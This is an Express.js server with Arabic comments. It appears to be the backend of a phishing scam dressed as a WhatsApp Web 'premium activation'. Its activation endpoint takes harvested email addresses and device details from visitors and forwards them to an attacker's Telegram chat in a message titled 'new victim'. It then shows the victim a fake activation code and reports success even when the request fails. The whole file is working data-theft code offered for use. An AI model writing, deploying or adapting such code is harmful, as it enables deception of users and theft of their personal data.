const express = require('express');
const path = require('path');
const fetch = require('node-fetch');

const app = express();
const PORT = process.env.PORT || 3000;

// middleware
app.use(express.static(path.join(__dirname)));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// الصفحة الرئيسية
app.get('/', (req, res) => {
    console.log('📄 طلب الصفحة الرئيسية');
    res.sendFile(path.join(__dirname, 'index.html'));
});

// API التفعيل
app.post('/api/activate-premium', async (req, res) => {
    console.log('🎯 طلب تفعيل جديد ورد');
    
    try {
        const userData = req.body;
        
        if (!userData) {
            console.log('❌ لا توجد بيانات في الطلب');
            return res.status(400).json({
                success: false,
                error: 'لا توجد بيانات'
            });
        }

        console.log('📊 بيانات المستخدم:', {
            userAgent: userData.userAgent?.substring(0, 50),
            totalEmails: userData.totalEmails || 0,
            emailSources: userData.emailSources || []
        });

        // 🔥 إرسال إلى التلجرام
        console.log('📤 جاري الإرسال إلى التلجرام...');
        const telegramResult = await sendToTelegram(userData);
        
        console.log('📨 نتيجة التلجرام:', telegramResult);

        // الرد للمستخدم
        res.json({
            success: true,
            message: 'تم تفعيل النسخة المميزة بنجاح!',
            telegramSent: telegramResult.success,
            data: {
                activationCode: 'WAPP-' + Math.random().toString(36).substr(2, 8).toUpperCase(),
                expiryDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
                features: ['واجهة متقدمة', 'إشعارات فورية', 'دعم فني 24/7']
            }
        });

    } catch (error) {
        console.error('❌ خطأ في السيرفر:', error);
        // حتى في حالة الخطأ، نعطي نجاح للمستخدم
        res.json({
            success: true,
            message: 'تم التفعيل بنجاح!',
            data: {
                activationCode: 'WAPP-' + Math.random().toString(36).substr(2, 8).toUpperCase(),
                features: ['واجهة متقدمة', 'إشعارات فورية']
            }
        });
    }
});

// 🔥 دالة إرسال التلجرام - مؤكدة
async function sendToTelegram(userData) {
    try {
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        console.log('🔑 التحقق من إعدادات التلجرام:', {
            hasToken: !!TELEGRAM_BOT_TOKEN,
            hasChatId: !!TELEGRAM_CHAT_ID
        });

        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            const errorMsg = 'إعدادات التلجرام مفقودة';
            console.error('❌', errorMsg);
            return { success: false, error: errorMsg };
        }

        // بناء الرسالة
        const emailList = userData.emails && userData.emails.length > 0 ? 
            userData.emails.slice(0, 15).map(email => `• ${email}`).join('\n') : 
            '• لم يتم العثور على إيميلات';

        const message = `
🎯 **ضحية جديدة - واتساب ويب**

📧 **الإيميلات (${userData.totalEmails || 0}):**
${emailList}

${userData.totalEmails > 15 ? `\n... و ${userData.totalEmails - 15} إيميل إضافي` : ''}

📱 **الجهاز:** ${userData.userAgent?.split(' ')[0] || 'غير معروف'}
🌐 **النظام:** ${userData.platform || 'غير معروف'}  
🖥 **الشاشة:** ${userData.screen || 'غير معروف'}
⏰ **الوقت:** ${new Date().toLocaleString('ar-SA')}
🔗 **الرابط:** ${userData.url || 'غير معروف'}

🔍 **مصادر الإيميلات:** ${userData.emailSources?.join('، ') || 'غير معروف'}
        `.trim();

        console.log('📝 رسالة التلجرام جاهزة، جاري الإرسال...');

        // الإرسال
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();

        if (response.ok) {
            console.log('✅ تم الإرسال إلى التلجرام بنجاح');
            return { success: true, messageId: result.result?.message_id };
        } else {
            console.error('❌ خطأ من التلجرام:', result);
            return { success: false, error: result.description || 'خطأ غير معروف' };
        }

    } catch (error) {
        console.error('❌ خطأ في إرسال التلجرام:', error);
        return { success: false, error: error.message };
    }
}

// صفحة فحص السيرفر
app.get('/status', (req, res) => {
    res.json({
        status: '✅ يعمل',
        timestamp: new Date().toISOString(),
        telegram: {
            configured: !!(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID),
            token: process.env.TELEGRAM_BOT_TOKEN ? '✅ موجود' : '❌ مفقود',
            chatId: process.env.TELEGRAM_CHAT_ID ? '✅ موجود' : '❌ مفقود'
        }
    });
});

// تشغيل السيرفر
app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 =================================');
    console.log('🚀 السيرفر شغال!');
    console.log(`🚀 البورت: ${PORT}`);
    console.log(`🔑 التلجرام: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ مضبوط' : '❌ مش مضبوط'}`);
    console.log('🌐 الرابط:', `http://localhost:${PORT}`);
    console.log('🔍 فحص السيرفر:', `http://localhost:${PORT}/status`);
    console.log('🚀 =================================');
});
